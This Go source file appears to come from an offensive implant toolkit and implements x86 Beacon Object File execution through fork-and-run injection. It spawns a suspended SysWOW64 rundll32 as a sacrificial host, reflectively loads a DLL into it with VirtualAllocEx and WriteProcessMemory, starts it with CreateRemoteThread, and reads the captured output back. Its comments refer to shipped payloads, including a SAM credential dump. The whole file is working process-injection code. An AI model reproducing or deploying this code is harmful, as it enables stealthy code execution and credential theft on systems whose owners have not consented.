//go:build windows

package bof

import (
	"encoding/binary"
	"errors"
	"fmt"
	"time"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// ErrCrossArchX86Unsupported is returned when Run or Load is fed a
// 32-bit (i386) COFF object and the implant cannot route it to the
// x86 fork-and-run path. The default build (no `bof_x86_loader`
// tag) always surfaces this; the tagged build only surfaces it
// when loadX86LoaderShellcode itself fails (e.g. an empty embed
// slot, which TestX86Loader_Embedded_NotEmpty guards against).
var ErrCrossArchX86Unsupported = errors.New("runtime/bof: x86 COFF detected but no x86 fork-and-run path available (rebuild with -tags=bof_x86_loader)")

// — Loader ABI constants — mirror of LOADER_* in
//   runtime/bof/internal/x86loader/abi.h. Kept in sync by hand;
//   the C header is the source of truth. Any rename there MUST
//   land here in the same commit.

const (
	loaderABIMagic   uint32 = 0x36384342 // 'BC86'
	loaderABIVersion uint32 = 1
)

const (
	loaderStatusPending     uint32 = 0
	loaderStatusRunning     uint32 = 1
	loaderStatusDone        uint32 = 2
	loaderStatusABIMismatch uint32 = 3
	loaderStatusResolveFail uint32 = 4
	loaderStatusLoadFail    uint32 = 5
	loaderStatusBOFCrashed  uint32 = 6
)

// loaderParamsSize is the on-the-wire size of loader_params_t.
// 17 uint32 active fields + 12 reserved uint32 = 29 × 4 = 116 B.
// A mismatch here vs the C struct is the kind of bug that surfaces
// only as LOADER_STATUS_ABI_MISMATCH in the field — the
// TestABIMagic_LittleEndianMatchesCSide regression test on the
// magic bytes is the cheapest tripwire.
const loaderParamsSize = 116

// Default capacities for the per-call output / error buffers.
// 256 KB output is the upper bound for the BOFs we ship today
// (whoami / ipconfig / netstat output is < 8 KB; SAM dump is the
// outlier at ~64 KB). 64 KB error is generous — BeaconError*
// emissions are typically < 1 KB per call.
const (
	defaultX86OutputCapacity uint32 = 256 * 1024
	defaultX86ErrorCapacity  uint32 = 64 * 1024
	defaultX86Timeout               = 30 * time.Second
	defaultX86Host                  = `C:\Windows\SysWOW64\rundll32.exe`
)

// x86BOF is the Runnable returned by coffX86Loader.Load. It owns
// the COFF .o bytes and orchestrates one fresh WoW64 host per
// Execute call — no state contamination between calls, the
// helper process is terminated and released after each
// invocation. Matches CS fork-and-run semantics.
//
// The `loaderDLL` slice is the i386 PE32 DLL bytes produced by
// scripts/build-bof-x86-loader.sh, embedded via go:embed under
// the bof_x86_loader build tag. Each Execute manually
// reflectively loads this DLL into a fresh WoW64 host: parses
// the PE header, VirtualAllocEx's the image, copies + relocates
// sections, then CreateRemoteThread targets the BOFExec export.
type x86BOF struct {
	bofBytes  []byte
	loaderDLL []byte

	timeout  time.Duration
	outCap   uint32
	errCap   uint32
	spawnTo  string
	userData []byte

	errOut []byte // captured by the most recent Execute
}

// Execute injects the BOF into a fresh WoW64 host, runs it, reads
// back the captured output, and terminates the host. Returns the
// captured stdout bytes; errors cover spawn, allocation, write,
// thread, timeout, and loader-reported failures.
func (x *x86BOF) Execute(args []byte) ([]byte, error) {
	host := x.spawnTo
	if host == "" {
		host = defaultX86Host
	}

	pi, err := spawnSuspended(host)
	if err != nil {
		return nil, err
	}
	// process + thread handles MUST close on every exit path,
	// including the panics that runtime/bof's sacrificial mode
	// guards against. Owning them via defer is clearer than
	// chasing the handles through every error site.
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)
	defer windows.TerminateProcess(pi.Process, 1)

	// Region 1: manual reflective DLL load. Allocate the full
	// SizeOfImage RW, parse + lay + relocate the loader DLL
	// against the allocated base, WriteProcessMemory the whole
	// image in one shot, then VirtualProtectEx each section to
	// its proper permissions (PAGE_READONLY / RW / EXECUTE_READ).
	codeAddr, entryAddr, err := reflectiveLoadIntoChild(pi.Process, x.loaderDLL)
	if err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: reflective load: %w", err)
	}
	_ = codeAddr // reserved for diagnostics; entry is computed from the exported BOFExec RVA

	// Region 2: IO buffers laid out back-to-back. The layout is
	//   [ BOF | args | user_data | spawn_to(NUL-term) | OUT | ERR ]
	// The shellcode reads the start of each sub-region via the
	// addresses recorded in the params block (region 3) — it
	// doesn't care about the order, only that the addresses
	// resolve to the right bytes.
	outCap, errCap := x.outCap, x.errCap
	if outCap == 0 {
		outCap = defaultX86OutputCapacity
	}
	if errCap == 0 {
		errCap = defaultX86ErrorCapacity
	}

	var spawnToBytes []byte
	if x.spawnTo != "" {
		spawnToBytes = append([]byte(x.spawnTo), 0)
	}
	ioBytes, off := buildIOBuffer(x.bofBytes, args, x.userData, spawnToBytes,
		outCap, errCap)

	ioAddr, err := allocRemote(pi.Process, uintptr(len(ioBytes)),
		windows.PAGE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: alloc io: %w", err)
	}
	if err := windows.WriteProcessMemory(pi.Process, ioAddr,
		&ioBytes[0], uintptr(len(ioBytes)), nil); err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: write io: %w", err)
	}

	// Region 3: params block. Populated with the absolute child-
	// process addresses of each sub-region inside region 2.
	paramsBytes := buildParamsBlock(
		uint32(ioAddr)+off.bof, uint32(len(x.bofBytes)),
		uint32(ioAddr)+off.args, uint32(len(args)),
		uint32(ioAddr)+off.userData, uint32(len(x.userData)),
		uint32(ioAddr)+off.spawnTo, // 0 if spawnTo unset (off.spawnTo will equal off.userData+0)
		uint32(ioAddr)+off.out, outCap,
		uint32(ioAddr)+off.err, errCap,
		x.spawnTo != "",
	)
	paramsAddr, err := allocRemote(pi.Process, uintptr(len(paramsBytes)),
		windows.PAGE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: alloc params: %w", err)
	}
	if err := windows.WriteProcessMemory(pi.Process, paramsAddr,
		&paramsBytes[0], uintptr(len(paramsBytes)), nil); err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: write params: %w", err)
	}

	// Fire — CreateRemoteThread at codeAddr with paramsAddr as
	// the single LPVOID argument the loader's __stdcall entry
	// reads off the stack.
	hThread, _, callErr := api.ProcCreateRemoteThread.Call(
		uintptr(pi.Process), 0, 0,
		entryAddr,
		paramsAddr,
		0,
		0,
	)
	if hThread == 0 {
		return nil, fmt.Errorf("runtime/bof/x86: CreateRemoteThread: %w", callErr)
	}
	threadH := windows.Handle(hThread)
	defer windows.CloseHandle(threadH)

	// Wait for the loader to finish or for the timeout.
	timeout := x.timeout
	if timeout <= 0 {
		timeout = defaultX86Timeout
	}
	waitMs := uint32(timeout / time.Millisecond)
	wr, err := windows.WaitForSingleObject(threadH, waitMs)
	if err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: WaitForSingleObject: %w", err)
	}
	if wr == uint32(windows.WAIT_TIMEOUT) {
		return nil, fmt.Errorf("runtime/bof/x86: loader timeout after %s", timeout)
	}

	// Read back: params first (for status + lengths), then
	// trimmed out/err buffers.
	paramsAfter := make([]byte, loaderParamsSize)
	if err := windows.ReadProcessMemory(pi.Process, paramsAddr,
		&paramsAfter[0], uintptr(loaderParamsSize), nil); err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: read params: %w", err)
	}

	status := binary.LittleEndian.Uint32(paramsAfter[8:])
	errCode := binary.LittleEndian.Uint32(paramsAfter[12:])
	outLen := binary.LittleEndian.Uint32(paramsAfter[52:])
	errLen := binary.LittleEndian.Uint32(paramsAfter[64:])

	if outLen > outCap {
		outLen = outCap
	}
	if errLen > errCap {
		errLen = errCap
	}

	output, errBytes, readErr := readOutAndErr(pi.Process,
		uintptr(uint32(ioAddr)+off.out), outLen,
		uintptr(uint32(ioAddr)+off.err), errLen)
	if readErr != nil {
		return nil, readErr
	}
	x.errOut = errBytes

	if e := classifyLoaderStatus(status, errCode); e != nil {
		return output, e
	}
	return output, nil
}

// Errors returns whatever the BOF wrote to its error buffer
// during the most recent Execute. Returns nil before the first
// Execute call. The slice is a fresh copy.
func (x *x86BOF) Errors() []byte {
	if x.errOut == nil {
		return nil
	}
	out := make([]byte, len(x.errOut))
	copy(out, x.errOut)
	return out
}

// SetSpawnTo overrides the WoW64 host. Default is
// SysWOW64\rundll32.exe with no argv (spawned suspended, never
// resumed — purely an address-space donor). Any 32-bit Windows
// executable works; the parent terminates it after the BOF
// completes.
func (x *x86BOF) SetSpawnTo(path string) { x.spawnTo = path }

// SetUserData mirrors (*BOF).SetUserData on the in-process path.
// Forwarded to the BOF via BeaconGetCustomUserData. Empty disables.
func (x *x86BOF) SetUserData(data []byte) {
	if len(data) == 0 {
		x.userData = nil
		return
	}
	x.userData = append([]byte(nil), data...)
}

// SetTimeout caps the WaitForSingleObject on the loader thread.
// Zero or negative restores the default (defaultX86Timeout).
func (x *x86BOF) SetTimeout(d time.Duration) { x.timeout = d }

// SetOutputCapacity / SetErrorCapacity override the per-call
// VirtualAllocEx sizes of the captured output / error buffers.
// Both default to defaultX86OutputCapacity / defaultX86ErrorCapacity.
// Zero restores the default.
func (x *x86BOF) SetOutputCapacity(n uint32) { x.outCap = n }
func (x *x86BOF) SetErrorCapacity(n uint32)  { x.errCap = n }

// — Helpers ----------------------------------------------------

// spawnSuspended starts `path` with CREATE_SUSPENDED and no argv.
// The main thread never resumes; the process exists only as an
// address-space donor for the loader shellcode.
func spawnSuspended(path string) (windows.ProcessInformation, error) {
	var pi windows.ProcessInformation
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return pi, fmt.Errorf("runtime/bof/x86: UTF16 host path: %w", err)
	}
	if err := windows.CreateProcess(nil, cmdLine, nil, nil, false,
		windows.CREATE_SUSPENDED, nil, nil, &si, &pi); err != nil {
		return pi, fmt.Errorf("runtime/bof/x86: CreateProcess(%s): %w", path, err)
	}
	return pi, nil
}

// allocRemote is a thin wrapper around VirtualAllocEx with
// MEM_COMMIT|MEM_RESERVE. Returns the remote base address.
func allocRemote(h windows.Handle, size uintptr, protect uint32) (uintptr, error) {
	addr, _, err := api.ProcVirtualAllocEx.Call(
		uintptr(h),
		0,
		size,
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(protect),
	)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx: %w", err)
	}
	return addr, nil
}

// ioOffsets records where each sub-region starts inside the
// region-2 IO buffer, indexed relative to the region's base.
type ioOffsets struct {
	bof, args, userData, spawnTo, out, err uint32
}

// buildIOBuffer concatenates the inputs + zeroed output buffers
// into a single byte slice. Returns the slice plus the per-field
// offsets so the params block can be filled with absolute child
// addresses.
func buildIOBuffer(bof, args, userData, spawnTo []byte, outCap, errCap uint32) ([]byte, ioOffsets) {
	off := ioOffsets{}
	off.bof = 0
	off.args = off.bof + uint32(len(bof))
	off.userData = off.args + uint32(len(args))
	off.spawnTo = off.userData + uint32(len(userData))
	off.out = off.spawnTo + uint32(len(spawnTo))
	off.err = off.out + outCap

	total := off.err + errCap
	buf := make([]byte, total)
	copy(buf[off.bof:], bof)
	copy(buf[off.args:], args)
	copy(buf[off.userData:], userData)
	copy(buf[off.spawnTo:], spawnTo)
	return buf, off
}

// buildParamsBlock marshals a loaderParams struct into the wire
// format expected by the C side. Field offsets mirror abi.h
// byte-for-byte.
func buildParamsBlock(
	bofAddr, bofLen,
	argsAddr, argsLen,
	userDataAddr, userDataLen,
	spawnToAddr uint32,
	outAddr, outCap uint32,
	errAddr, errCap uint32,
	hasSpawnTo bool,
) []byte {
	buf := make([]byte, loaderParamsSize)
	put := func(off int, v uint32) { binary.LittleEndian.PutUint32(buf[off:], v) }

	put(0, loaderABIMagic)
	put(4, loaderABIVersion)
	put(8, loaderStatusPending)
	// 12: error_code stays zero — the loader writes it on failure
	put(16, bofAddr)
	put(20, bofLen)
	put(24, argsAddr)
	put(28, argsLen)
	put(32, userDataAddr)
	put(36, userDataLen)
	if hasSpawnTo {
		put(40, spawnToAddr)
	}
	put(44, outAddr)
	put(48, outCap)
	// 52: out_len stays zero
	put(56, errAddr)
	put(60, errCap)
	// 64: err_len stays zero
	// 68..115: reserved[12] stays zero
	return buf
}

// readOutAndErr reads `outLen` bytes from outAddr and `errLen`
// bytes from errAddr into freshly-allocated slices. Zero-length
// reads short-circuit; non-zero reads use a single
// ReadProcessMemory per buffer.
func readOutAndErr(h windows.Handle,
	outAddr uintptr, outLen uint32,
	errAddr uintptr, errLen uint32,
) ([]byte, []byte, error) {
	var output, errBytes []byte
	if outLen > 0 {
		output = make([]byte, outLen)
		if err := windows.ReadProcessMemory(h, outAddr,
			&output[0], uintptr(outLen), nil); err != nil {
			return nil, nil, fmt.Errorf("runtime/bof/x86: read out: %w", err)
		}
	}
	if errLen > 0 {
		errBytes = make([]byte, errLen)
		if err := windows.ReadProcessMemory(h, errAddr,
			&errBytes[0], uintptr(errLen), nil); err != nil {
			return nil, nil, fmt.Errorf("runtime/bof/x86: read err: %w", err)
		}
	}
	return output, errBytes, nil
}

// classifyLoaderStatus maps loader_status_t values to Go errors.
// DONE returns nil; non-DONE statuses surface as named errors so
// callers can errors.Is against them. error_code carries the
// loader-specific detail (xor of magic for ABI mismatch, SEH code
// for crashes, etc.).
func classifyLoaderStatus(status, errCode uint32) error {
	switch status {
	case loaderStatusDone:
		return nil
	case loaderStatusPending:
		return errors.New("runtime/bof/x86: loader did not run (status=PENDING)")
	case loaderStatusRunning:
		return errors.New("runtime/bof/x86: loader exited mid-run (status=RUNNING)")
	case loaderStatusABIMismatch:
		return fmt.Errorf("runtime/bof/x86: ABI mismatch (status=ABI_MISMATCH, magic_xor=0x%X)", errCode)
	case loaderStatusResolveFail:
		return errors.New("runtime/bof/x86: loader could not resolve a kernel32 symbol")
	case loaderStatusLoadFail:
		return fmt.Errorf("runtime/bof/x86: COFF load failed inside loader (errno=0x%X)", errCode)
	case loaderStatusBOFCrashed:
		return fmt.Errorf("runtime/bof/x86: BOF crashed (SEH=0x%X)", errCode)
	default:
		return fmt.Errorf("runtime/bof/x86: unknown loader status 0x%X (errno=0x%X)", status, errCode)
	}
}

// coffX86Loader registers under KindCOFFx86. Returns a usable
// *x86BOF when the bof_x86_loader tag is active and the embed
// slot is non-empty; otherwise surfaces ErrCrossArchX86Unsupported.
type coffX86Loader struct{}

func (coffX86Loader) Kind() Kind { return KindCOFFx86 }

func (coffX86Loader) Load(b []byte) (Runnable, error) {
	sc, err := loadX86LoaderShellcode()
	if err != nil {
		return nil, err
	}
	if len(sc) == 0 {
		return nil, ErrCrossArchX86Unsupported
	}
	bofCopy := make([]byte, len(b))
	copy(bofCopy, b)
	return &x86BOF{
		bofBytes:  bofCopy,
		loaderDLL: sc,
		timeout:   defaultX86Timeout,
		outCap:    defaultX86OutputCapacity,
		errCap:    defaultX86ErrorCapacity,
	}, nil
}

func init() {
	registerLoader(coffX86Loader{})
}
